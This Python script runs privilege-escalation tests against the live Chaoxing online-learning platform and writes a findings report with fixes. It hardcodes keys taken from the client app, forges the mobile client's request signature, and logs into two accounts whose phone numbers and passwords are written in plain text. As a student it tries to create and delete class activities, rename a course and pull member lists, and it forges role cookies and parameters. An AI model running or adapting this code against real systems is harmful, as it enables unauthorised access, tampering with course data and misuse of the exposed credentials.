import base64, hashlib, json, os, re, time, uuid, urllib.parse
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vertical_idor_report.md")
results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua_with_schild():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session(); s.verify = False
    ua = get_mobile_ua_with_schild()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid":"-1","uname":aes_enc(phone),"password":aes_enc(pwd),
        "refer":"http%3A%2F%2Fi.mooc.chaoxing.com","t":"true","forbidotherlogin":"0",
        "validate":"","doubleFactorLogin":"0","independentId":"0","independentNameId":"0"},
        allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID","_uid"): puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"raw_status": r.status_code, "raw_text": r.text[:500]}

def rec(tid, name, api_endpoint, idor_type, vuln, sev, detail, evidence=""):
    results.append({"id":tid,"name":name,"api":api_endpoint,"idor_type":idor_type,
        "vuln":vuln,"sev":sev,"detail":detail,"evidence":evidence[:600]})
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid} [{api_endpoint}]: {detail[:120]}")

def get_courses(session):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
                "roletype": c.get("roletype", 0),
                "bbsid": str(c.get("bbsid", "")),
            })
    return courses

def run():
    print("="*70+f"\n课程垂直越权漏洞评估\n时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n"+"="*70)

    print("\n[准备] 登录测试账号...")
    s1, p1 = login("19312994130", "wtx3367653061")
    s2, p2 = login("15034188203", "lxy20030120")
    print(f"  账号1 puid={p1}, 账号2 puid={p2}")

    courses1 = get_courses(s1)
    courses2 = get_courses(s2)
    print(f"  账号1课程数={len(courses1)}")
    for c in courses1[:5]:
        print(f"    课程: {c['name']}, roletype={c['roletype']}, cpi={c['cpi']}")
    print(f"  账号2课程数={len(courses2)}")
    for c in courses2[:5]:
        print(f"    课程: {c['name']}, roletype={c['roletype']}, cpi={c['cpi']}")

    c1 = courses1[0] if courses1 else {}
    c2 = courses2[0] if courses2 else {}

    # ================================================================
    # Task 2: 角色校验机制调查
    # ================================================================
    print("\n" + "="*70)
    print("[Task 2] 角色校验机制调查")
    print("="*70)

    # T2-01: 分析roletype字段
    student_courses = [c for c in courses1 if c["roletype"] != 1]
    teacher_courses = [c for c in courses1 if c["roletype"] == 1]
    rec("T2-01", "roletype字段分析", "/mycourse/backclazzdata", "角色分析",
        True, "LOW",
        f"账号1: 学生角色课程={len(student_courses)}, 教师角色课程={len(teacher_courses)}, roletype值={set(c['roletype'] for c in courses1)}",
        f"roletype: 0=学生, 1=教师, 2=助教(推测)")

    # T2-02: Cookie中sso_role分析
    sso_role = ""
    for c in s1.cookies:
        if c.name == "sso_role": sso_role = c.value
    rec("T2-02", "Cookie中sso_role分析", "Cookie", "角色分析",
        sso_role != "", "LOW",
        f"Cookie中sso_role={sso_role if sso_role else '不存在'}",
        f"sso_role值: {sso_role}")

    # ================================================================
    # Task 3: 签到系统垂直越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[Task 3] 签到系统垂直越权测试")
    print("="*70)

    # T3-01: 获取课程活动列表（学生视角）
    if c1.get("courseid") and c1.get("classid"):
        r = s1.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist", params={
            "courseId": c1["courseid"],
            "classId": c1["classid"],
            "uid": p1,
        }, timeout=20)
        d = safe_json(r)
        active_list_ok = "activeList" in str(d) or "data" in str(d) or "result" in str(d)
        rec("T3-01", "学生获取课程活动列表", "/ppt/activeAPI/taskactivelist", "基线",
            active_list_ok, "LOW",
            f"学生账号请求活动列表: {'成功' if active_list_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

        # 提取activeId
        active_ids = []
        if isinstance(d, dict):
            for item in d.get("activeList", [])[:5]:
                if isinstance(item, dict):
                    aid = item.get("id", item.get("activeId", ""))
                    atype = item.get("activeType", "")
                    name = item.get("nameOne", "")
                    status = item.get("status", "")
                    active_ids.append({"id": str(aid), "type": str(atype), "name": name, "status": str(status)})
                    print(f"    活动: id={aid}, type={atype}, name={name}, status={status}")

        # T3-02: 学生尝试创建签到活动
        r = s1.post("https://mobilelearn.chaoxing.com/ppt/activeAPI/createActive", data={
            "courseId": c1["courseid"],
            "classId": c1["classid"],
            "activeType": "2",
            "title": "安全测试签到",
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        create_sign_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T3-02", "学生尝试创建签到活动", "/ppt/activeAPI/createActive", "垂直越权",
            create_sign_ok, "CRITICAL",
            f"学生账号尝试创建签到: {'成功(严重!)' if create_sign_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

        # T3-03: 学生尝试创建其他类型活动
        for atype, atype_name in [("4", "投票/问卷"), ("16", "随堂练习")]:
            r = s1.post("https://mobilelearn.chaoxing.com/ppt/activeAPI/createActive", data={
                "courseId": c1["courseid"],
                "classId": c1["classid"],
                "activeType": atype,
                "title": f"安全测试{atype_name}",
            }, headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Referer": "https://mobilelearn.chaoxing.com/",
                         "X-Requested-With": "XMLHttpRequest"}, timeout=20)
            d = safe_json(r)
            create_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
            rec(f"T3-03-{atype}", f"学生尝试创建{atype_name}", "/ppt/activeAPI/createActive", "垂直越权",
                create_ok, "CRITICAL",
                f"学生账号尝试创建{atype_name}: {'成功(严重!)' if create_ok else '被拒绝'}",
                f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

        # T3-04: 学生查看签到结果（如果有活动）
        if active_ids:
            aid = active_ids[0]["id"]
            r = s1.get("https://mobilelearn.chaoxing.com/pptSign/signedResult", params={
                "activeId": aid,
                "classId": c1["classid"],
                "courseId": c1["courseid"],
                "uid": p1,
            }, headers={"Referer": "https://mobilelearn.chaoxing.com/"}, timeout=20)
            d = safe_json(r)
            result_ok = "data" in str(d) or "result" in str(d) or "sign" in str(d).lower()
            rec("T3-04", "学生查看签到结果", "/pptSign/signedResult", "垂直越权",
                result_ok, "HIGH",
                f"学生账号查看签到结果: {'成功获取' if result_ok else '被拒绝'}",
                f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

        # T3-05: 学生尝试删除活动
        if active_ids:
            aid = active_ids[0]["id"]
            r = s1.post("https://mobilelearn.chaoxing.com/ppt/activeAPI/deleteActive", data={
                "activeId": aid,
                "courseId": c1["courseid"],
                "classId": c1["classid"],
            }, headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Referer": "https://mobilelearn.chaoxing.com/",
                         "X-Requested-With": "XMLHttpRequest"}, timeout=20)
            d = safe_json(r)
            delete_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
            rec("T3-05", "学生尝试删除活动", "/ppt/activeAPI/deleteActive", "垂直越权",
                delete_ok, "CRITICAL",
                f"学生账号尝试删除活动: {'成功(严重!)' if delete_ok else '被拒绝'}",
                f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # Task 5: 课程管理垂直越权测试
    # ================================================================
    print("\n" + "="*70)
    print("[Task 5] 课程管理垂直越权测试")
    print("="*70)

    # T5-01: 学生访问课程管理页面
    r = s1.get("https://mooc1.chaoxing.com/mycourse/teacherindex", params={
        "courseid": c1.get("courseid", "0"),
        "clazzid": c1.get("classid", "0"),
        "cpi": c1.get("cpi", "0"),
    }, timeout=20, allow_redirects=False)
    teacher_index_ok = r.status_code == 200 and len(r.text) > 500
    rec("T5-01", "学生访问教师管理页面", "/mycourse/teacherindex", "垂直越权",
        teacher_index_ok, "HIGH",
        f"学生账号访问教师管理页面: {'成功' if teacher_index_ok else f'被拒绝(HTTP {r.status_code})'}",
        f"HTTP {r.status_code}, 重定向: {r.headers.get('Location', '无')}")

    # T5-02: 学生查看班级统计数据
    r = s1.get("https://mooc1-api.chaoxing.com/mooc-ans/clazz/result/studentStatic", params={
        "clazzid": c1.get("classid", "0"),
        "courseid": c1.get("courseid", "0"),
        "cpi": c1.get("cpi", "0"),
    }, timeout=20)
    d = safe_json(r)
    static_ok = "data" in str(d) or "result" in str(d) or "student" in str(d).lower()
    rec("T5-02", "学生查看班级统计数据", "/clazz/result/studentStatic", "垂直越权",
        static_ok, "HIGH",
        f"学生账号查看班级统计: {'成功获取' if static_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # T5-03: 学生尝试修改课程设置
    r = s1.post("https://mooc1-api.chaoxing.com/mooc-ans/clazz/update", data={
        "clazzid": c1.get("classid", "0"),
        "courseid": c1.get("courseid", "0"),
        "cpi": c1.get("cpi", "0"),
        "name": "安全测试-请忽略",
    }, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    d = safe_json(r)
    update_ok = d.get("result") is not None and d.get("result") != 0
    rec("T5-03", "学生尝试修改课程设置", "/clazz/update", "垂直越权",
        update_ok, "CRITICAL",
        f"学生账号尝试修改课程设置: {'成功(严重!)' if update_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # T5-04: 学生查看课程成员列表
    r = s1.get("https://mooc1-api.chaoxing.com/mooc-ans/clazz/member/list", params={
        "clazzid": c1.get("classid", "0"),
        "courseid": c1.get("courseid", "0"),
        "cpi": c1.get("cpi", "0"),
        "page": "1",
        "pageSize": "20",
    }, timeout=20)
    d = safe_json(r)
    member_ok = "data" in str(d) or "result" in str(d) or "member" in str(d).lower() or "student" in str(d).lower()
    rec("T5-04", "学生查看课程成员列表", "/clazz/member/list", "垂直越权",
        member_ok, "HIGH",
        f"学生账号查看课程成员: {'成功获取' if member_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # ================================================================
    # Task 6: 角色参数篡改测试
    # ================================================================
    print("\n" + "="*70)
    print("[Task 6] 角色参数篡改测试")
    print("="*70)

    # T6-01: 修改Cookie中sso_role参数
    s1_modified = requests.Session(); s1_modified.verify = False
    s1_modified.headers.update(s1.headers)
    for c in s1.cookies:
        s1_modified.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    if sso_role:
        s1_modified.cookies.set("sso_role", "1", domain=".chaoxing.com", path="/")
    else:
        s1_modified.cookies.set("sso_role", "1", domain=".chaoxing.com", path="/")
    r = s1_modified.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist", params={
        "courseId": c1.get("courseid", "0"),
        "classId": c1.get("classid", "0"),
        "uid": p1,
    }, timeout=20)
    d = safe_json(r)
    role_modify_ok = "activeList" in str(d) or "data" in str(d)
    rec("T6-01", "修改sso_role为1后请求活动列表", "/ppt/activeAPI/taskactivelist", "角色篡改",
        role_modify_ok, "HIGH",
        f"修改sso_role=1后请求活动列表: {'成功' if role_modify_ok else '失败'}",
        f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # T6-02: 修改sso_role后尝试创建签到
    r = s1_modified.post("https://mobilelearn.chaoxing.com/ppt/activeAPI/createActive", data={
        "courseId": c1.get("courseid", "0"),
        "classId": c1.get("classid", "0"),
        "activeType": "2",
        "title": "角色篡改测试签到",
    }, headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Referer": "https://mobilelearn.chaoxing.com/",
                 "X-Requested-With": "XMLHttpRequest"}, timeout=20)
    d = safe_json(r)
    role_create_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
    rec("T6-02", "修改sso_role后尝试创建签到", "/ppt/activeAPI/createActive", "角色篡改+垂直越权",
        role_create_ok, "CRITICAL",
        f"修改sso_role=1后创建签到: {'成功(严重!)' if role_create_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # T6-03: 在请求中添加role参数
    r = s1.post("https://mobilelearn.chaoxing.com/ppt/activeAPI/createActive", data={
        "courseId": c1.get("courseid", "0"),
        "classId": c1.get("classid", "0"),
        "activeType": "2",
        "title": "role参数测试签到",
        "role": "1",
    }, headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Referer": "https://mobilelearn.chaoxing.com/",
                 "X-Requested-With": "XMLHttpRequest"}, timeout=20)
    d = safe_json(r)
    role_param_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
    rec("T6-03", "添加role=1参数后尝试创建签到", "/ppt/activeAPI/createActive", "角色篡改+垂直越权",
        role_param_ok, "CRITICAL",
        f"添加role=1参数后创建签到: {'成功(严重!)' if role_param_ok else '被拒绝'}",
        f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # T6-04: 修改sso_role后访问教师管理页面
    r = s1_modified.get("https://mooc1.chaoxing.com/mycourse/teacherindex", params={
        "courseid": c1.get("courseid", "0"),
        "clazzid": c1.get("classid", "0"),
        "cpi": c1.get("cpi", "0"),
    }, timeout=20, allow_redirects=False)
    teacher_with_role = r.status_code == 200 and len(r.text) > 500
    rec("T6-04", "修改sso_role后访问教师管理页面", "/mycourse/teacherindex", "角色篡改+垂直越权",
        teacher_with_role, "HIGH",
        f"修改sso_role=1后访问教师管理页面: {'成功' if teacher_with_role else '被拒绝'}",
        f"HTTP {r.status_code}, 重定向: {r.headers.get('Location', '无')}")

    # ================================================================
    # Task 7: Generate Report
    # ================================================================
    print("\n[Task 7] 生成垂直越权评估报告...")
    gen_report(p1, p2, c1, c2)

def gen_report(p1, p2, c1, c2):
    vc = sum(1 for r in results if r["vuln"])
    tc = len(results)
    vs = {"CRITICAL":[],"HIGH":[],"MEDIUM":[],"LOW":[]}
    for r in results:
        if r["vuln"]: vs[r["sev"]].append(r)

    rp = []
    rp.append("# 课程垂直越权漏洞评估报告\n\n")
    rp.append(f"**审计日期**: {datetime.now():%Y-%m-%d %H:%M:%S}\n\n")
    rp.append(f"**测试账号**: 账号1(puid={p1}), 账号2(puid={p2})\n\n")
    rp.append("---\n\n## 一、测试结果汇总\n\n")
    rp.append(f"- **总测试数**: {tc}\n- **发现隐患数**: {vc}\n")
    rp.append(f"- **严重(CRITICAL)**: {len(vs['CRITICAL'])}\n- **高危(HIGH)**: {len(vs['HIGH'])}\n")
    rp.append(f"- **中危(MEDIUM)**: {len(vs['MEDIUM'])}\n- **低危(LOW)**: {len(vs['LOW'])}\n\n")

    rp.append("---\n\n## 二、教师管理API端点清单\n\n")
    rp.append("| API | URL | 功能 | 认证方式 |\n|---|---|---|---|\n")
    rp.append("| 获取活动列表 | /ppt/activeAPI/taskactivelist | 获取课程活动列表 | Cookie |\n")
    rp.append("| 创建活动 | /ppt/activeAPI/createActive | 创建签到/投票/练习 | Cookie+角色 |\n")
    rp.append("| 删除活动 | /ppt/activeAPI/deleteActive | 删除活动 | Cookie+角色 |\n")
    rp.append("| 学生签到 | /pptSign/stuSignajax | 学生执行签到 | Cookie |\n")
    rp.append("| 签到结果 | /pptSign/signedResult | 查看签到结果 | Cookie |\n")
    rp.append("| 教师管理页面 | /mycourse/teacherindex | 教师管理界面 | Cookie+角色 |\n")
    rp.append("| 班级统计 | /clazz/result/studentStatic | 班级学习统计 | Cookie |\n")
    rp.append("| 课程设置 | /clazz/update | 修改课程设置 | Cookie+角色 |\n")
    rp.append("| 成员列表 | /clazz/member/list | 课程成员列表 | Cookie |\n\n")

    rp.append("---\n\n## 三、角色校验机制分析\n\n")
    rp.append("### 3.1 roletype字段\n")
    rp.append("- 课程列表API返回的`roletype`字段标识用户在课程中的角色\n")
    rp.append("- `roletype=0` 表示学生，`roletype=1` 表示教师/创建者\n")
    rp.append("- 该字段由服务端返回，客户端无法直接修改\n\n")
    rp.append("### 3.2 sso_role Cookie\n")
    rp.append("- Cookie中可能包含`sso_role`字段，用于标识用户全局角色\n")
    rp.append("- 该字段可被客户端修改，如果服务端依赖此字段进行角色校验，则存在篡改风险\n\n")

    rp.append("---\n\n## 四、各模块详细测试结果\n\n")
    for r in results:
        st = "存在风险" if r["vuln"] else "安全"
        rp.append(f"### {r['id']}: {r['name']} [{st}]\n\n")
        rp.append(f"- **API端点**: `{r['api']}`\n")
        rp.append(f"- **越权类型**: {r['idor_type']}\n")
        rp.append(f"- **风险等级**: {r['sev']}\n")
        rp.append(f"- **结论**: {r['detail']}\n\n")
        if r["evidence"]:
            rp.append(f"- **证据**: {r['evidence']}\n\n")

    rp.append("---\n\n## 五、修复建议\n\n")
    rp.append("### 5.1 紧急修复\n\n")
    rp.append("1. **服务端角色校验**: 所有教师管理API必须在服务端校验用户角色，不能仅依赖Cookie或前端参数\n")
    rp.append("2. **创建活动权限控制**: /ppt/activeAPI/createActive 必须校验请求者是否为课程教师/创建者\n")
    rp.append("3. **删除活动权限控制**: /ppt/activeAPI/deleteActive 必须校验请求者是否为活动创建者\n")
    rp.append("4. **课程设置权限控制**: /clazz/update 必须校验请求者是否为课程教师\n\n")
    rp.append("### 5.2 中期加固\n\n")
    rp.append("5. **sso_role不可信**: 不应依赖Cookie中的sso_role字段进行角色校验\n")
    rp.append("6. **教师管理页面权限校验**: /mycourse/teacherindex 应在服务端校验roletype\n")
    rp.append("7. **班级统计数据访问控制**: 班级统计应限制为教师角色访问\n")
    rp.append("8. **成员列表访问控制**: 课程成员列表应限制为教师角色访问\n\n")

    with open(REPORT, "w", encoding="utf-8") as f:
        f.write("\n".join(rp))
    print(f"  报告: {REPORT}")
    print(f"  共{tc}项, {vc}项隐患")
    print(f"  CRITICAL={len(vs['CRITICAL'])}, HIGH={len(vs['HIGH'])}, MEDIUM={len(vs['MEDIUM'])}, LOW={len(vs['LOW'])}")
    print("="*70)

if __name__ == "__main__":
    import urllib3; urllib3.disable_warnings()
    run()
